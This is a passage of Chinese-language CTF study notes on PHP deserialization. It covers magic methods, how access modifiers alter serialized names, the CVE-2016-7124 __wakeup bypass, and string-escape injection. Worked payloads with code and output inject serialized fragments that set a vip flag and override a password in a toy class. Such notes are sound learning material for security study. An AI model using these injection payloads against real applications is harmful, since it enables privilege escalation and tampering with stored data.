<p>具有<code>__construct()</code>函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作。</p>
<h2 id="destruct">2.6 <code>__destruct()</code></h2>
<p><code>__destruct</code>函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p>
<h2 id="set">2.7 <code>__set()</code></h2>
<p>给不可访问属性赋值时，<code>__set()</code> 会被调用。</p>
<h2 id="get">2.8 <code>__get()</code></h2>
<p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p>
<h2 id="isset">2.9 <code>__isset()</code></h2>
<p>对不可访问属性调用 <code>__isset()</code> 或 <code>empty()</code>
时，<code>__isset()</code> 会被调用。</p>
<h2 id="unset">2.10 <code>__unset()</code></h2>
<p>对不可访问属性调用 <code>unset()</code>时，<code>__unset()</code>
会被调用。</p>
<h2 id="callstatic">2.10 <code>__callStatic()</code></h2>
<p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code>
会被调用。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">Note:</span> value of $name is case sensitive.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Triggering __call method when calling  method &#x27;<span class="subst">$name</span>&#x27; with arguments &#x27;&quot;</span> . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;&#x27;.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MethodTest::callStaticTest(<span class="string">&#x27;arg3&#x27;</span>,<span class="string">&#x27;arg4&#x27;</span>);  <span class="comment">// As of PHP 5.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">Triggering __call method when calling  method &#x27;callStaticTest&#x27; with arguments &#x27;arg3, arg4&#x27;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="call">2.11 <code>__call()</code></h2>
<p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">Note:</span> value of $name is case sensitive.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Triggering __call method when calling  method &#x27;<span class="subst">$name</span>&#x27; with arguments &#x27;&quot;</span> . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;&#x27;.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> MethodTest;</span><br><span class="line"><span class="variable">$obj</span>-&gt;callTest(<span class="string">&#x27;arg1&#x27;</span>,<span class="string">&#x27;arg2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">Triggering __call method when calling  method &#x27;callTest&#x27; with arguments &#x27;arg1, arg2&#x27;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="访问控制修饰符">3 访问控制修饰符</h1>
<p>根据访问控制修饰符的不同，序列化后的 <strong>属性长度</strong> 和
<strong>属性值</strong> 会有所不同。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>(公有)</span><br><span class="line"><span class="keyword">protected</span>(受保护)</span><br><span class="line"><span class="keyword">private</span>(私有的)</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> 属性被序列化的时候属性名会变成：%<span class="number">00</span>*%<span class="number">00</span>属性名</span><br><span class="line"><span class="keyword">private</span> 属性被序列化的时候属性名会变成：%<span class="number">00</span>类名%<span class="number">00</span>属性名</span><br><span class="line"></span><br><span class="line">注意：这里的%<span class="number">00</span>其实是\<span class="number">0</span>经过urlencode得到的，而\<span class="number">0</span>长度是<span class="number">1</span>，所以%<span class="number">00</span>的长度也是<span class="number">1</span>，切记！！！可以数下面例子的长度。</span><br></pre></td></tr></table></figure></p>
<p>like this: <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;<span class="comment">//这里是private属性被序列化</span></span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;%00*%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;%00*%00cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;&#125;<span class="comment">//这里是protected属性被序列化</span></span><br></pre></td></tr></table></figure></p>
<p>注意：<code>var</code> 为 <code>public</code>
的别名。php中必须使用这三个修饰符，如果没有，则必须使用 <code>var</code>
代替 <code>pubic</code>。</p>
<p>如果不想复制的时候没复制到不可见字符，可以将得到的字符串进行url编码！[[MRCTF2020
Ezpop]]</p>
<h1 id="绕过-__wakeup-函数">4 绕过 __wakeup() 函数</h1>
<p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。该方法和__sleep()相反，前者使用serialize()时自动调用，后者当使用
unserialize() 时自动调用。</p>
<p>该方法有一个漏洞(CVE-2016-7124)，只需要序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过执行。</p>
<h1 id="字符串逃逸">5 字符串逃逸</h1>
<p>原理：先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p>
<p>有两种情况：</p>
<ol type="1">
<li>过滤后字符变多</li>
<li>过滤后字符变少</li>
</ol>
<h2 id="过滤后字符变多">5.1 过滤后字符变多</h2>
<p>假设定义如下一个类： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser</span>;</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>此时如果有一个过滤函数，并将反序列后的字符串带入执行：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hacker&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>注意对比上面两者的输出结果，会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:5:&quot;admin&quot;;</span><br><span class="line">s:5:&quot;hacker&quot;;</span><br><span class="line"></span><br><span class="line">明显下面hacker长度为6，大于5，按理来说这是不应该的。这就是漏洞所在</span><br></pre></td></tr></table></figure></p>
<p>这时候<code>admin</code>（被过滤的）就是我们的可控变量，假设我们需要把vip属性变为1。
对比现有的子串和目标子串(部分比较)： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125; // 现有</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125; // 目标</span><br></pre></td></tr></table></figure></p>
<p>我们可以要在admin这个可控变量的位置，<strong>注入目标子串</strong></p>
<p>计算目标字串的长度： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125; //长度42</span><br></pre></td></tr></table></figure></p>
<p>也就是需要逃逸的字符串长度为42，每次admin过滤后都变为hacker，也就是每有一个admin，过滤后长度都会增加1。利用这个漏洞，我们输入42个admin，这样子过滤后字符串长度就会增加42，因此可控变量修改为：
<code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:3:"123";s:3:"vip";i:1;&#125;</code></p>
<p>完整程序如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hacker&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_ser_filter</span> = filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">252</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:3:&quot;</span><span class="number">111</span><span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>发现有42个hacker，长度正好与252对应。</p>
<blockquote>
<p>反序列化后，多余的字串会被抛弃。而password（不在username里面的）就会被抛弃。</p>
</blockquote>
<p>将这个结果反序列化得到如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(User)#2 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(252) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [&quot;vip&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意看密码与我们输入的password不同，而是与username里面的password相同；并且，vip字段也修改为1。</p>
<blockquote>
<p>解释：username=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:3:"111";s:3:"vip";i:1;}
长度为252；而username=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker
长度也是252
因此系统将所有的hack接收为username之后正好达到了username的长度，所以会将";s:8:"password";s:3:"111";s:3:"vip";i:1;}放到password字段。注意，这里前面的<strong><code>";</code>正好将username闭合</strong>，然后后面的s:8:"password";s:3:"111";s:3:"vip";i:1;}<strong>正好又符合password和vip属性的反序列化要求</strong>，就会被当作password和vip属性进行反序列化，<strong><code>;</code>将vip属性闭合</strong>，<strong><code>&#125;</code>将序列化后的子串闭合</strong>，这样子就形成一个完整的序列化对象，而后面的"111"就会被抛弃。</p>
</blockquote>
<p>注意：一定要闭合：属性之间的闭合用<code>;</code>，闭合序列化对象用的是<code>&#125;</code>。</p>
<h2 id="过滤后字符变少">5.2 过滤后字符变少</h2>
<p>主体和上面一样，区别就是过滤函数变为如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对比过滤前后的字符串： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span><br><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为过滤的时候，将<strong>5</strong>个字符删减为了<strong>4</strong>个，所以和上面字符变多的情况相反，随着加入的<strong>admin</strong>的数量增多，<strong>现有子串</strong>后面会缩进来。</p>
<p>计算以下目标字串长度： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;  </span><br><span class="line">//长度42</span><br></pre></td></tr></table></figure></p>
<p>计算到<strong>下一个可控变量</strong>（这里是password）的字符串（称为缩进串）长度：
^184190 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;</span><br><span class="line">// 长度为22</span><br></pre></td></tr></table></figure></p>
<p>因为每次过滤都会减少一个字符，因此减少22个字符就能将上面的缩进串缩进username属性里面
（注意，这里演示所以每次就减少一个字符串，可能一次减少3个字符串，此时需要8个，也就是缩短了24个字符，我们输入的时候多输入2个字符，让其缩进到前一个属性即可）
^8660cb</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。<strong>所以需要闭合！闭合！闭合！</strong></p>
<p>分析：这里s指定的长度是110，而从第一个双引号开始的105个字符为：<code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:3:"</code>，这字符串会被当作username属性值。</p>
<p><strong>重点</strong>：所以<code>111</code>就成为了可控变量，也就是我们输入的password变为了可控变量。将111替换为我们的目标字串即可，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>, <span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="comment">//var_dump(unserialize(filter($a_ser)));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
<p>会发现报错了，其实这里有一个细节：</p>
<p><strong>细节</strong>：替换之前我们的输入的密码为111，只有3位数，因此我们缩进串的长度只有22，而替换为目标子串后，“password”的长度为42，此时的缩进串长度为23，所以我们需要有23个admin。最终代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>, <span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>); </span><br><span class="line">var_dump(unserialize(filter(<span class="variable">$a_ser</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="keyword">object</span>(User)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">115</span>) <span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">  [<span class="string">&quot;vip&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结">5.3 总结</h2>
<p>两种情况是不一样的，前者是把目标子串写在第一个变量，然后让第一个变量变长，挤走原先的第二个变量，让目标子串占据第二变量的位置从而被反序列化。而后者是把目标子串写在第二变量，然后让第一变量长度变短，将[[#^184190|缩进串]]缩进到第一变量里面，然后把目标子串占据第二变量的位置从而被反序列化。</p>
<p>两者都要注意：<strong>闭合</strong>；</p>
<p>后者还需要注意</p>
<ol type="1">
<li>缩进串长度的变化</li>
<li>不能够正好将缩进串缩到前一个变量的情况</li>
</ol>
<p>bugku_newphp运用到了这个知识点。</p>
<h1 id="属性中含有数组该如何反序列化">6
属性中含有数组该如何反序列化</h1>
